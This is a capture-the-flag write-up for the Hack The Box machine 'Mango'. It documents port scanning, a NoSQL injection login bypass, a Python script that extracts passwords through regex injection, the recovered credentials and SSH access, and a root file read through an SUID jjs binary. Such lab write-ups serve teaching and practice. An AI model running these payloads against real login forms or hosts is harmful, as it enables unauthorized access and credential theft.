# MANGO

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/mango]
└─$ nmap 10.10.10.162
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 03:25 EDT
Nmap scan report for 10.10.10.162
Host is up (0.28s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 51.13 seconds
                                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/mango]
└─$ nmap 10.10.10.162 -p 22,80,443 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 03:26 EDT
Nmap scan report for 10.10.10.162
Host is up (0.28s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 443

![](https://github.com/Leo-2807/Writeups/blob/main/images/mango1.png)

## ANALYTICS.PHP

![](https://github.com/Leo-2807/Writeups/blob/main/images/mango2.png)

## CERTIFICATE

![](https://github.com/Leo-2807/Writeups/blob/main/images/mango3.png)

Here we find another domain `staging-order.mango.htb`

## STAGING-ORDER.MANGO.HTB

opening the domain with https gives the same page but opening it with http retuens a new page.

![](https://github.com/Leo-2807/Writeups/blob/main/images/mango4.png)

I used sqlmap t see if there was some sql injection that the form was vulnerable to but it was not.
Since there was a injection tag on the box I google searched for mango sql injection and found that mangoDB is vulnerable to `nosql injection`.

I used this [cheatsheet](https://book.hacktricks.xyz/pentesting-web/nosql-injection) to look for a injection that works.
`username[$ne]=toto&password[$ne]=toto`
I used burpsuit to intercept my request and injected `[$ne]` in the request.

![](https://github.com/Leo-2807/Writeups/blob/main/images/mango5.png)

And this we got redirected to `/home.php`.

![](https://github.com/Leo-2807/Writeups/blob/main/images/mango6.png)

But it seemed like a dead end from here. 

## SSH

I went back a few steps and looked at the cheatsheet again to see what else can be done with the nosql injections.

At the end od the cheatsheet there was a credentials bruteforce script which we can use to bruteforce password and usernames.

I copied the script and made some changes for it to work.

On running the script we find two usernames `admin and mango` but no password.  

On reading again it seems like regex does support certain characters.
So I write a script to find passwords for the usernames we got.

```python
#!/usr/bin/env python3

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username = "admin"
passwd = ""
url = "http://staging-order.mango.htb"

restart = True

while restart:
    restart = False
    
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            password = passwd + c
            payload = {"username":username, "password[$regex]": "^" + password + ".*"} 
            r = requests.post(url, data=payload, allow_redirects=False)
            if r.status_code == 302:
                print(password)
                restart = True
                passwd=password
                if c == "$":
                    print(passwd)
                    exit(0)
                break
```

Running the script twice we get the password for both the usernames.
```
admin:t9KcS3>!0B#2
mango:h3mXK8RhU~f{]f5H
```
Using the username mango we are able to ssh into the machine.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/mango]
└─$ ssh mango@10.10.10.162   
mango@10.10.10.162's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 17 10:56:52 UTC 2021

  System load:  0.01               Processes:            103
  Usage of /:   26.7% of 19.56GB   Users logged in:      0
  Memory usage: 27%                IP address for ens33: 10.10.10.162
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.


Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
```

The user.txt is in the home directory of user admin.
We can use su to esecalate to user admin.

```bash
mango@mango:/home$ su admin
Password: 
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/home$ cd admin
admin@mango:/home/admin$ ls
user.txt
```
## PRIVESEC

### LINPEAS.SH

There were two vulnerbilities that were found by linpeas

```bash
...snip...
╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                 
                                                                                                                                                                                      
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
...snip...
╔══════════╣ SUID - Check easy privesc, exploits and write perms  
...snip...
-rwsr-sr-- 1 root   admin            11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
...snip...
```

On searching both of them on `gtfobins` we find that for exploiting pkexec we need sudo permission which we don't have.
So onto the next `jjs` can be easily exploited since we have suid permission.

The command given under the SUID category on gtfobins only work on macOS.

But we can read files as root using jjs.

```bash
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
```

And got the root.txt

```bash
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
cfc7e474bf0d9c3791f104b048cc1d8c
jjs> admin@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ 
```